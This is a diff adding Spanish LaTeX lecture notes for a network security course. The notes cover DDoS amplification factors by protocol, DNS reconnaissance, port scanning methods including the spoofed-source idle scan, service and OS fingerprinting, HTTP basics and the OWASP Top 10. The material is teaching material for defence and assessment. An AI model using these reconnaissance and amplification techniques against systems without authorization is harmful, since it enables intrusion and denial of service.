+      \item ¡Amplificación! La clave es la \textbf{asimetría} entre los bytes enviados y los recibidos.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.15}%
+\begin{tabular}{l r l}
+\toprule
+\textbf{Protocolo} & \textbf{BAF} & \textbf{Comando vulnerable} \\
+\midrule
+DNS & 28 a 54 & véase TA13-088A \\
+\rowcolor{yellow!25} NTP (\emph{Network Time Protocol}) & 556,9 & véase TA14-013A \\
+SNMPv2 & 6,3 & \emph{GetBulk request} \\
+NetBIOS & 3,8 & Resolución de nombres \\
+SSDP & 30,8 & \emph{SEARCH request} \\
+CharGEN & 358,8 & Petición de generación de caracteres \\
+QOTD & 140,3 & Petición de cita \\
+BitTorrent & 3,8 & Búsqueda de ficheros \\
+Kad & 16,3 & Intercambio de lista de pares \\
+Quake Network Protocol & 63,9 & Información del servidor \\
+Steam Protocol & 5,5 & Información del servidor \\
+Multicast DNS (mDNS) & 2 a 10 & Consulta \emph{unicast} \\
+RIPv1 & 131,24 & Petición malformada \\
+Portmap (RPCbind) & 7 a 28 & Petición malformada \\
+LDAP & 46 a 55 & Petición malformada \\
+CLDAP & 56 a 70 & --- \\
+TFTP & 60 & --- \\
+Memcached & 10.000 a 51.000 & --- \\
+WS-Discovery & 10 a 500 & --- \\
+\bottomrule
+\end{tabular}}
+\end{center}
+{\small Las referencias TA son avisos técnicos (\emph{Technical Alerts}) del US-CERT. En clase se destacó NTP.}
+ 
+\section{Defensas integrales}
+ 
+\begin{itemize}
+  \item Tratar la pila TCP/IP como un \textbf{canal inseguro}.
+  \item Implementar \textbf{seguridad de extremo a extremo} (E2E, \emph{End-to-End}) para las aplicaciones:
+    \begin{itemize}
+      \item TLS (\emph{Transport Layer Security}).
+      \item Túneles seguros (VPN, \emph{Virtual Private Network}).
+    \end{itemize}
+  \item Además: \textbf{filtrado de red y control de acceso}.
+    \begin{itemize}
+      \item Usar dispositivos de red que filtren tanto tráfico indeseado como sea posible:
+        \begin{itemize}
+          \item Cortafuegos (\emph{firewalls}).
+          \item IDS/IPS (\emph{Intrusion Detection / Prevention System}).
+          \item Protección frente a (D)DoS.
+        \end{itemize}
+    \end{itemize}
+\end{itemize}
+ 
+%=====================================================================
+\chapter{Descubrimiento y escaneo de redes}
+%=====================================================================
+ 
+\section{Descubrimiento de equipos (\emph{host discovery})}
+ 
+\begin{itemize}
+  \item \textbf{Objetivo}: reducir un conjunto de IP a una \textbf{lista de equipos activos o interesantes}. Por ejemplo, solo los equipos que ejecutan cierto servicio, o todos los equipos activos.
+  \item Los escáneres de red ofrecen múltiples opciones:
+    \begin{itemize}
+      \item Comprobar solo (o excluir) los equipos de una lista.
+      \item Elegir objetivos al azar.
+      \item Especificar subconjuntos mediante máscaras de red.
+    \end{itemize}
+\end{itemize}
+ 
+\subsection{Usando el DNS}
+ 
+\begin{itemize}
+  \item El DNS es una \textbf{fuente de información valiosa}.
+  \item Comandos \texttt{nslookup}, \texttt{host} y \texttt{dig}:
+    \begin{itemize}
+      \item \texttt{nslookup} (\emph{name server lookup}): consultas DNS sencillas, de nombre a IP y viceversa.
+      \item \texttt{host}: sustituto de \texttt{nslookup}, con más opciones y detalle.
+      \item \texttt{dig} (\emph{Domain Information Groper}): todavía más opciones y detalle.
+      \item Todos sirven para consultar los tipos de registro DNS habituales: \texttt{A}, \texttt{AAAA}, \texttt{CNAME}, \texttt{NS}, \texttt{SOA}, \texttt{TXT}, \texttt{AXFR}\footnote{En rigor, \texttt{AXFR} (\emph{Authoritative Zone Transfer}) no es un tipo de registro sino un tipo de consulta: pide la transferencia completa de una zona. Si un servidor la permite a cualquiera, revela de golpe todos los nombres del dominio.}, etc.
+    \end{itemize}
+  \item Comando \texttt{whois}:
+    \begin{itemize}
+      \item Consulta registros en la base de datos que mantienen los NIC (\emph{Network Information Centers}).
+      \item Muestra información potencialmente valiosa, como el registrador (\emph{registrar}) del dominio.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{2.0cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Registro} & \textbf{Qué contiene} \\
+\midrule
+\texttt{A} / \texttt{AAAA} & Dirección IPv4 / IPv6 de un nombre (\texttt{AAAA} porque una IPv6 es cuatro veces más larga). \\
+\texttt{CNAME} & \emph{Canonical Name}: alias de otro nombre. \\
+\texttt{NS} & \emph{Name Server}: servidores autoritativos de la zona. \\
+\texttt{SOA} & \emph{Start of Authority}: datos administrativos de la zona. \\
+\texttt{TXT} & Texto libre (p.\,ej., verificaciones de dominio o SPF). \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+{\small Tabla añadida para recordar qué es cada tipo de registro.}
+ 
+\subsection{Técnicas de descubrimiento}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{2.4cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Técnica} & \textbf{Qué envía} & \textbf{Cómo sabe que el equipo está activo} \\
+\midrule
+\textbf{ICMP ping} & \emph{Echo request}, \emph{timestamp request}, \emph{info request}, etc. & Responde. \textbf{Bloqueado} (por equipos o cortafuegos) en muchos casos. \\
+\textbf{TCP SYN ping} & Paquete TCP vacío con el \emph{flag} SYN (por defecto, al puerto 80) & Responde con SYN/ACK. \\
+\textbf{TCP ACK ping} & Paquete TCP vacío con el \emph{flag} ACK a un puerto dado & Responde con RST. \\
+\textbf{UDP ping} & Paquete UDP a un puerto dado & Devuelve ICMP \emph{port unreachable} si el puerto está cerrado (mejor usar un puerto improbable). \\
+\textbf{IP ping} & Paquete IP con distintos números de protocolo en la cabecera (p.\,ej., 2 para IGMP, 4 para IP-in-IP, y también TCP/UDP/ICMP) & Cualquier respuesta, incluida ``protocolo no soportado''. \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\section{Escaneo de puertos (\emph{port scanning})}
+ 
+\subsection{Puertos TCP y UDP}
+ 
+\begin{itemize}
+  \item \textbf{16 bits}: del 0 al 65.535.
+  \item Del 1 al 1023 son \textbf{puertos reservados} para servicios conocidos: se necesita ser \emph{root}\footnote{En la transparencia pone ``\emph{Toot}'', una errata de \emph{root}.} para hacer \emph{bind} y escuchar en ellos.
+  \item \textbf{Puerto 0}: si una aplicación pide el puerto 0, el sistema le asigna uno del rango de \textbf{puertos efímeros}.
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \fill[red!15] (0,0) rectangle (0.5,0.8);
+  \fill[uc3m!20] (0.5,0) rectangle (3.6,0.8);
+  \fill[uc3m!8] (3.6,0) rectangle (9.4,0.8);
+  \fill[gray!15] (9.4,0) rectangle (14.6,0.8);
+  \draw[gray] (0,0) rectangle (14.6,0.8);
+  \foreach \x in {0.5,3.6,9.4} \draw[gray] (\x,0) -- (\x,0.8);
+  \node at (0.25,0.4) {\scriptsize 0};
+  \node[font=\footnotesize] at (2.05,0.4) {\textbf{Conocidos}};
+  \node[font=\footnotesize] at (6.5,0.4) {\textbf{Registrados}};
+  \node[font=\footnotesize] at (12.0,0.4) {\textbf{Dinámicos / privados}};
+  \node[below, font=\scriptsize] at (0.5,0) {1};
+  \node[below, font=\scriptsize] at (3.6,0) {1023 | 1024};
+  \node[below, font=\scriptsize] at (9.4,0) {49.151 | 49.152};
+  \node[below, font=\scriptsize] at (14.6,0) {65.535};
+\end{tikzpicture}
+\end{center}
+{\small Escala no proporcional.}
+ 
+La IANA (\emph{Internet Assigned Numbers Authority}) clasifica los puertos en:
+\begin{itemize}
+  \item \textbf{Conocidos} (\emph{well-known}): del 1 al 1.023.
+  \item \textbf{Registrados} (\emph{registered}): del 1.024 al 49.151. Son servicios con nombre, aunque no muy conocidos ni usados. Los usuarios sin privilegios pueden hacer \emph{bind} sobre ellos.
+  \item \textbf{Dinámicos / privados} (\emph{dynamic/private}): del 49.152 al 65.535.
+\end{itemize}
+ 
+\subsection{Para qué sirve}
+ 
+\begin{itemize}
+  \item El escaneo de puertos busca descubrir los \textbf{servicios en ejecución} en un equipo remoto.
+  \item Es una \textbf{buena práctica de seguridad}:
+    \begin{itemize}
+      \item Descubrir y apagar servicios desconocidos o no deseados que se arrancan por defecto.
+      \item Inspeccionar dispositivos expuestos a los que no se puede acceder por shell remota (p.\,ej., routers/AP, teléfonos VoIP, etc.).
+      \item Detectar \emph{malware} (\emph{bots} o implantes).
+    \end{itemize}
+\end{itemize}
+ 
+\subsection{Técnicas de escaneo}
+ 
+Hay muchísimas; aquí se ven solo algunas.
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{2.3cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Técnica} & \textbf{Envía} & \textbf{Abierto} & \textbf{Cerrado} & \textbf{Filtrado} \\
+\midrule
+\textbf{TCP SYN} (\emph{stealth}) & SYN & SYN+ACK (el escáner corta con RST) & RST & Sin respuesta o ICMP \emph{unreachable} \\
+\textbf{TCP connect} & \emph{Handshake} completo, luego RST & Conexión establecida & RST & Sin respuesta \\
+\textbf{UDP} & Paquete UDP & Respuesta & ICMP \emph{port unreachable} & Sin respuesta u otro ICMP \emph{unreachable} \\
+\textbf{FIN / NULL / Xmas} & FIN / ningún \emph{flag} / FIN+PSH+URG & Sin respuesta & RST & No se distingue de abierto \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\subsubsection*{TCP SYN (\emph{stealth}) scan}
+\begin{itemize}
+  \item Envía un paquete TCP con el \emph{flag} SYN.
+  \item Si el equipo remoto responde con SYN+ACK, el puerto está abierto y el escáner \textbf{corta la conexión con RST}, sin llegar a completarla (de ahí lo de ``sigiloso'').
+  \item Si responde con RST, el puerto está \textbf{cerrado}.
+  \item Sin respuesta o con un error ICMP \emph{unreachable}, el puerto está \textbf{filtrado} (bloqueado por un cortafuegos, equipo apagado, etc.).
+\end{itemize}
+ 
+\subsubsection*{TCP connect scan}
+\begin{itemize}
+  \item Completa el \emph{3-way handshake} y luego corta la conexión con RST.
+  \item En general es \textbf{peor opción} que el SYN scan, pero es la \textbf{única} si el usuario no tiene privilegios para crear paquetes en bruto (\emph{raw packets}).
+\end{itemize}
+ 
+\subsubsection*{UDP scan}
+\begin{itemize}
+  \item Envía un paquete UDP. Si hay respuesta, el puerto está \textbf{abierto}.
+  \item ICMP \emph{port unreachable} $\Rightarrow$ \textbf{cerrado}.
+  \item Sin respuesta u otro error ICMP \emph{unreachable} $\Rightarrow$ \textbf{filtrado}.
+\end{itemize}
+ 
+\subsubsection*{TCP FIN, NULL y Xmas scans}
+\begin{itemize}
+  \item Aprovechan resquicios de la especificación de TCP (RFC 793\footnote{RFC = \emph{Request for Comments}, los documentos que definen los estándares de Internet. La RFC 793 quedó sustituida en 2022 por la RFC 9293, que reúne en un solo documento la especificación actual de TCP.}): \emph{cualquier paquete que no lleve los bits SYN, RST ni ACK provoca un RST si el puerto está cerrado, y ninguna respuesta si está abierto}.
+  \item \textbf{FIN}: envía TCP solo con el \emph{flag} FIN.
+  \item \textbf{NULL}: envía TCP sin ningún \emph{flag}.
+  \item \textbf{Xmas}: envía TCP con los \emph{flags} FIN, PSH y URG. Se llama así porque el paquete queda ``iluminado como un árbol de Navidad'' (\emph{Christmas}).
+  \item No todos los sistemas implementan la RFC 793 estrictamente: algunos envían RST tanto si el puerto está cerrado como si no.
+\end{itemize}
+ 
+\subsubsection*{TCP idle scan}
+ 
+El atacante escanea el objetivo \textbf{sin enviarle paquetes desde su propia IP}: usa un tercer equipo, el \textbf{zombi}, y observa cómo cambia el campo \emph{IP ID} de este, que en muchos sistemas se incrementa en 1 con cada paquete enviado.
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[caja, fill=red!8, draw=red!60!black, minimum width=2.2cm] (a) at (0,0) {Atacante};
+  \node[cajagris, minimum width=2.2cm] (z) at (5.5,-3.2) {Zombi};
+  \node[caja, minimum width=2.2cm] (o) at (11,0) {Objetivo};
+  \draw[flecha, red!60!black] (a) to[bend left=12] node[etiq, sloped, above, text=red!60!black] {1 y 3: SYN/ACK} (z);
+  \draw[flecha] (z) to[bend left=12] node[etiq, sloped, below] {RST (revela su IP ID)} (a);
+  \draw[flecha, red!60!black] (a) -- node[etiq, above, text=red!60!black] {2: SYN con origen\,=\,zombi} (o);
+  \draw[flecha, dashed] (o) -- node[etiq, sloped, above=3pt, pos=0.45, font=\scriptsize] {SYN/ACK si abierto, RST si cerrado} (z);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{enumerate}
+  \item \textbf{Paso 1}: el atacante envía un SYN/ACK al zombi. El zombi, que no lo esperaba, responde con un RST y \textbf{revela su IP ID} (p.\,ej., 31337).
+  \item \textbf{Paso 2}: el atacante \textbf{falsifica un SYN} con la IP del zombi como origen y lo envía al objetivo.
+  \item \textbf{Paso 3}: el atacante vuelve a sondear el IP ID del zombi.
+\end{enumerate}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{1.6cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}p{2.6cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}p{2.6cm}}
+\toprule
+\textbf{Puerto} & \textbf{Qué pasa en el paso 2} & \textbf{IP ID en el paso 3} & \textbf{Conclusión} \\
+\midrule
+\textbf{Abierto} & El objetivo responde al zombi con SYN/ACK. El zombi no lo esperaba y envía un RST, incrementando su IP ID. & 31339 (\textbf{+2}) & ¡Abierto! \\
+\textbf{Cerrado} & El objetivo responde al zombi con RST. El zombi ignora el RST no solicitado y no envía nada. & 31338 (\textbf{+1}) & No abierto \\
+\textbf{Filtrado} & El objetivo descarta el SYN y no responde. El zombi no se entera de nada. & 31338 (\textbf{+1}) & No abierto (indistinguible de cerrado) \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\section{Detección de servicios y versiones}
+ 
+\begin{itemize}
+  \item En una evaluación de vulnerabilidades es importante saber exactamente el \textbf{tipo y la versión} del servidor que escucha en un puerto.
+  \item La técnica habitual son las \textbf{sondas de servicio} (\emph{service probes}):
+    \begin{itemize}
+      \item Enviar uno o varios paquetes manipulados (o nada: solo escuchar).
+      \item Capturar la respuesta (\emph{banner} o datos que envía el servidor).
+      \item Compararla con un conjunto de firmas (expresiones regulares, patrones, etc.).
+    \end{itemize}
+\end{itemize}
+ 
+\begin{ejemplo}{Fragmento del fichero de sondas de Nmap (\texttt{nmap-service-probes})}
+\begin{verbatim}
+# This is the NULL probe that just compares any banners given to us
+Probe TCP NULL q||
+totalwaitms 5000
+match ftp m/^220[ -]Microsoft FTP Service\r\n/ p/Microsoft ftpd/
+match ftp m/^220 ProFTPD (\d\S+) Server/ p/ProFTPD/ v/$1/
+ 
+Probe UDP Help q|help\r\n\r\n|
+ports 7,13,37
+match chargen m|@ABCDEFGHIJKLMNOPQRSTUVWXYZ|
+\end{verbatim}
+\texttt{Probe} define qué se envía (la sonda \texttt{NULL} no envía nada y solo escucha). Cada \texttt{match} asocia una expresión regular sobre la respuesta con un producto (\texttt{p/}) y, si se puede, una versión (\texttt{v/}).
+\end{ejemplo}
+ 
+\section{Detección remota del sistema operativo}
+ 
+\begin{itemize}
+  \item Motivos para identificar el SO de un equipo remoto:
+    \begin{itemize}
+      \item Determinar vulnerabilidades y \textbf{adaptar los \emph{exploits}}.
+      \item \textbf{Inventario} de red.
+      \item Detectar dispositivos \textbf{no autorizados y peligrosos}.
+    \end{itemize}
+  \item Mismo enfoque que para los servicios: \textbf{\emph{fingerprinting} TCP/IP mediante sondas}.
+    \begin{itemize}
+      \item Se prueban distintas opciones y características de la pila TCP/IP.
+      \item Las \textbf{diferencias de implementación} revelan el SO o el fabricante del dispositivo.
+    \end{itemize}
+\end{itemize}
+ 
+%=====================================================================
+\chapter{Seguridad web}
+%=====================================================================
+ 
+\section{¿Qué es la web?}
+ 
+\begin{itemize}
+  \item El \textbf{mayor sistema de información distribuido} que existe.
+  \item Una colección de servicios de capa de aplicación para distribuir contenido.
+  \item La capa tecnológica sobre la que se apoyan la mayoría de las plataformas de Internet. HTTP funciona en la práctica como un protocolo de ``transporte'' para aplicaciones \emph{over-the-top} (OTT, las que se ofrecen por encima de la red sin depender del operador).
+  \item Una gran fuente de problemas de seguridad y privacidad, tanto en el \textbf{lado del servidor} como en el \textbf{lado del cliente}.
+\end{itemize}
+ 
+\section{Seguridad web: lado del cliente}
+ 
+\begin{itemize}
+  \item El \textbf{navegador} tiene un papel relativamente sencillo: conectarse a una dirección web, obtener y mostrar su contenido y transmitir datos del usuario a esa dirección.
+  \item Pero:
+    \begin{itemize}
+      \item Para resolver una petición, a menudo se conecta a \textbf{más de una dirección}, lo que abre la puerta al abuso.
+      \item \textbf{Ejecuta programas} cuya funcionalidad puede ser maliciosa.
+      \item El propio software del navegador puede ser \textbf{explotado}.
+    \end{itemize}
+  \item Más complicaciones:
+    \begin{itemize}
+      \item Mostrar datos implica un rico conjunto de órdenes para controlar la representación, el posicionamiento, las capas, la invisibilidad, etc. $\Rightarrow$ más abusos (\emph{clickjacking}: engañar al usuario para que haga clic en algo oculto).
+      \item El navegador puede acceder a datos del ordenador del usuario.
+      \item Hace transferencias de datos sin el conocimiento ni el permiso del usuario.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{importante}
+El navegador es un \textbf{software gigantesco con muchísimas vulnerabilidades}, expuesto a Internet, cuyas conexiones de red son inviables de monitorizar en profundidad. \textbf{La seguridad del lado del cliente no se estudia en esta asignatura.}
+\end{importante}
+ 
+\section{Seguridad web: lado del servidor}
+ 
+\begin{itemize}
+  \item \textbf{Punto de entrada para los usuarios}:
+    \begin{itemize}
+      \item A una variedad de servicios.
+      \item Personalizado (p.\,ej., mediante \emph{cookies}).
+      \item Apoyado en aplicaciones de \emph{backend} complejas (p.\,ej., bases de datos).
+    \end{itemize}
+  \item \textbf{Objetivo de los atacantes}:
+    \begin{itemize}
+      \item Protocolo común.
+      \item Admite una gran variedad de entradas.
+      \item Interacciones de software muy complejas.
+      \item Se ejecuta con \textbf{privilegios altos}.
+      \item A menudo está conectado a otros objetivos valiosos.
+    \end{itemize}
+  \item Área \textbf{compleja y multidimensional} que incluye la seguridad de la infraestructura, las vulnerabilidades introducidas por las aplicaciones web y la gestión del acceso a los recursos ofrecidos por la web.
+\end{itemize}
+ 
+\begin{multicols}{2}
+\textbf{Aspectos:}
+\begin{itemize}
+  \item Seguridad de las comunicaciones.
+  \item Seguridad del servidor.
+  \item Autenticación.
+  \item Autorización.
+  \item Validación de entradas.
+  \item Ficheros y recursos.
+  \item Gestión de errores.
+  \item Protección de datos.
+\end{itemize}
+\end{multicols}
+ 
+\section{Arquitectura de una aplicación web}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[cajagris, minimum width=3.2cm, minimum height=2.6cm, align=center] (c) at (0,0) {\textbf{Cliente}\\[3pt]{\footnotesize navegador,}\\{\footnotesize cliente pesado,}\\{\footnotesize script\ldots}};
+  \node[caja, minimum width=4.4cm, minimum height=2.6cm, align=center] (s) at (5.6,0) {\textbf{Servidor}\\[3pt]{\footnotesize Servidor web: Apache, Nginx, IIS}\\{\footnotesize Serv.\ de aplicaciones: Tomcat, JBoss}\\{\footnotesize Lenguaje: PHP, Java, Ruby, ASP}\\{\footnotesize Frameworks: .NET, Django}};
+  \node[cajagris, minimum width=3.4cm, minimum height=2.6cm, align=center] (b) at (11.4,0) {\textbf{Almacenamiento}\\[3pt]{\footnotesize ficheros, BD relacional,}\\{\footnotesize otras BD (Mongo),}\\{\footnotesize directorios (LDAP)}};
+  \draw[flecha, <->] (c) -- node[etiq, above=3pt] {HTTP} (s);
+  \draw[flecha, <->] (s) -- (b);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{itemize}
+  \item \textbf{Cliente}: navegador web, cliente pesado (\emph{thick client}) que se conecta a un servicio, \emph{script}, etc.
+  \item \textbf{Servidor}: recibe las peticiones del cliente y envía las respuestas. Puede combinar varias tecnologías:
+    \begin{itemize}
+      \item Servidor web: Apache, Nginx, IIS, etc.
+      \item Servidor de aplicaciones: Tomcat, JBoss, etc.
+      \item Lenguaje de programación / framework: PHP, Java, Ruby, ASP y frameworks (.NET, Django, etc.).
+    \end{itemize}
+  \item \textbf{Almacenamiento / \emph{backend}}: en el mismo servidor o en otra máquina. Distintas tecnologías:
+    \begin{itemize}
+      \item Sistema de ficheros simple.
+      \item BD relacional: MySQL, Oracle, SQL Server, PostgreSQL.
+      \item Otras tecnologías de BD (p.\,ej., Mongo).
+      \item Directorios (p.\,ej., Active Directory o LDAP).
+    \end{itemize}
+\end{itemize}
+ 
+\section{El protocolo HTTP}
+ 
+\begin{itemize}
+  \item Protocolo de transporte básico de la web.
+  \item Diálogo \textbf{petición--respuesta} entre un cliente y un servidor.
+  \item Protocolo de \textbf{texto} $\Rightarrow$ legible por humanos.
+  \item Los servidores suelen escuchar en el puerto \textbf{80} (HTTP) o \textbf{443} (HTTPS).
+  \item Una petición habitual pide contenido al servidor y contiene:
+    \begin{itemize}
+      \item Un \textbf{método}, que indica la operación que quiere hacer el cliente.
+      \item Un \textbf{recurso} sobre el que operar.
+      \item Varias \textbf{cabeceras}, con información adicional para el servidor.
+      \item Un \textbf{cuerpo}, que depende del método.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{ejemplo}{Petición a \texttt{http://vulnerable.com/index.php}}
+\begin{verbatim}
+GET /index.php HTTP/1.1
+Host: vulnerable
+User-Agent: Mozilla Firefox
+\end{verbatim}
+\end{ejemplo}
+ 
+\subsection{Métodos HTTP}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{2.0cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Método} & \textbf{Uso} \\
+\midrule
+\texttt{GET} & Pide contenido. \\
+\texttt{POST} & Envía una cantidad mayor de datos y sube ficheros. \\
+\texttt{HEAD} & Como \texttt{GET}, pero la respuesta solo trae las cabeceras, sin cuerpo. Lo usan masivamente las arañas (\emph{spiders}) para ver si una página ha cambiado. \\
+\texttt{PUT} & Guarda una entidad de datos bajo la URI indicada. \\
+\texttt{DELETE} & Borra un recurso. \\
+\texttt{TRACE} & Devuelve la petición recibida. Sirve para ver qué cambios o añadidos han hecho los equipos intermedios. \\
+\texttt{OPTIONS} & Devuelve los métodos HTTP que admite el servidor para la URL indicada (incluido \texttt{*}). \\
+\texttt{CONNECT} & Convierte la conexión en un túnel TCP/IP transparente, normalmente para pasar HTTPS a través de un \emph{proxy} HTTP sin cifrar. \\
+\texttt{PATCH} & Aplica modificaciones parciales a un recurso. \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+Todo servidor HTTP de propósito general debe implementar \textbf{al menos \texttt{GET} y \texttt{HEAD}}. Los demás se consideran opcionales.
+ 
+\subsection{Parámetros HTTP}
+ 
+\begin{ejemplo}{Con \texttt{GET}: van en la URL}
+La petición \texttt{http://vulnerable/article.php?id=1\&name=2} envía al servidor:
+\begin{verbatim}
+GET /article.php?id=1&name=2 HTTP/1.1
+Host: vulnerable
+User-Agent: Mozilla Firefox
+\end{verbatim}
+\end{ejemplo}
+ 
+\begin{ejemplo}{Con \texttt{POST}: van en el cuerpo de la petición}
+\begin{verbatim}
+POST /login.php HTTP/1.1
+Host: vulnerable
+User-Agent: Mozilla Firefox
+Content-Length: 35
+ 
+username=admin&password=Password123
+\end{verbatim}
+\end{ejemplo}
+ 
+\subsection{Cabeceras HTTP}
+ 
+\begin{itemize}
+  \item \texttt{Host}: indica a qué sitio web se quiere acceder cuando el mismo servidor aloja varios.
+  \item \texttt{Referer}: indica de dónde viene el cliente.
+  \item \texttt{Cookie}: devuelve las \emph{cookies}.
+  \item \texttt{User-Agent}: indica qué navegador usa el cliente.
+  \item \texttt{X-Forwarded-For}: para obtener la IP de origen (aunque no es el mejor método).
+\end{itemize}
+\ldots y muchísimas más.
+ 
+\subsection{Respuesta del servidor}
+ 
+Contiene un \textbf{código de estado} (véase la \href{https://en.wikipedia.org/wiki/List_of_HTTP_status_codes}{lista de códigos de estado HTTP en Wikipedia}) y \textbf{cabeceras}, como:
+\begin{itemize}
+  \item \texttt{Server}: información sobre el servidor web remoto.
+  \item \texttt{X-Powered-By}: más información sobre el servidor.
+  \item \texttt{Content-Length}: tamaño de la respuesta.
+  \item \texttt{Content-Type}: qué debe esperar el navegador.
+\end{itemize}
+ 
+\begin{ejemplo}{Ejemplo de respuesta}
+\begin{verbatim}
+HTTP/1.1 200 OK
+Date: Mon, 23 May 2005 22:38:34 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 138
+Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
+Server: Apache/1.3.3.7 (Unix) (Red-Hat/Linux)
+ETag: "3f80f-1b6-3e1cb03b"
+Accept-Ranges: bytes
+Connection: close
+ 
+<html>
+  <head>
+    <title>An Example Page</title>
+  </head>
+  <body>
+    <p>Hello World, this is a very simple HTML document.</p>
+  </body>
+</html>
+\end{verbatim}
+\end{ejemplo}
+ 
+\noindent Las cabeceras \texttt{Server} o \texttt{X-Powered-By} le dan al atacante el producto y la versión exactos sin necesidad de sondas.
+ 
+\subsection{\emph{Cookies}}
+ 
+\begin{itemize}
+  \item Sirven para \textbf{mantener información entre dos peticiones HTTP} (la IP no basta).
+  \item El servidor las envía con la cabecera \texttt{Set-Cookie}.
+    \begin{itemize}
+      \item Tienen muchos campos opcionales: \textbf{fecha de expiración}, \textbf{dominio}, \textbf{ruta}, etc.
+      \item \emph{Flags} de seguridad:
+        \begin{itemize}
+          \item \texttt{httpOnly}: impide que el código JavaScript acceda a la \emph{cookie}.
+          \item \texttt{secure}: impide que el navegador envíe la \emph{cookie} por conexiones HTTP inseguras.
+        \end{itemize}
+    \end{itemize}
+  \item El navegador devuelve la \emph{cookie} al servidor en todas las peticiones siguientes con la cabecera \texttt{Cookie}.
+\end{itemize}
+ 
+\subsection{Autenticación HTTP}
+ 
+\begin{itemize}
+  \item HTTP ofrece un marco general incorporado para control de acceso y autenticación.
+  \item Dos métodos:
+    \begin{itemize}
+      \item \textbf{Basic}: usuario y contraseña se envían codificados en base64 en una cabecera de autorización:
+\begin{verbatim}
+Authorization: basic YWRtaW46YWRtaW4K
+\end{verbatim}
+      \item \textbf{Digest}: mecanismo de desafío--respuesta.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{importante}
+\textbf{base64 es una codificación, no un cifrado}: cualquiera la deshace. La cadena del ejemplo se decodifica directamente como \texttt{admin:admin}. Por eso la autenticación \emph{Basic} solo tiene sentido sobre HTTPS.
+\end{importante}
+ 
+\subsection{HTTP/2}
+ 
+\begin{itemize}
+  \item Revisión importante del protocolo HTTP.
+  \item Alta compatibilidad con HTTP en métodos, códigos de estado, URI, etc.
+  \item \textbf{Reduce la latencia} mediante:
+    \begin{itemize}
+      \item compresión de las cabeceras HTTP;
+      \item \emph{server push} (el servidor envía recursos antes de que se los pidan);
+      \item multiplexación de varias peticiones HTTP sobre una única conexión TCP.
+    \end{itemize}
+  \item HTTP/3 ``está en camino''\footnote{Desde que se hicieron estas transparencias, HTTP/3 se publicó como estándar (RFC 9114, junio de 2022). Funciona sobre QUIC, que va sobre UDP en vez de TCP.}.
+\end{itemize}
+ 
+\section{OWASP}
+ 
+\begin{definicion}{OWASP}
+\emph{Open Web Application Security Project}: una fundación sin ánimo de lucro que trabaja para \textbf{mejorar la seguridad del software}. Su lista más conocida es el \textbf{OWASP Top 10}, con los diez riesgos de seguridad más críticos en aplicaciones web. Su logo es una avispa (\emph{wasp}), por el juego de palabras con el nombre.
+\end{definicion}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.2}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\centering\arraybackslash}p{0.6cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{OWASP Top 10 -- 2013} & & \textbf{OWASP Top 10 -- 2017} \\
+\midrule
+A1 -- Injection & $\to$ & A1 -- Injection \\
+A2 -- Broken Authentication and Session Management & $\to$ & A2 -- Broken Authentication \\
+A3 -- Cross-Site Scripting (XSS) & $\searrow$ & A3 -- Sensitive Data Exposure \\
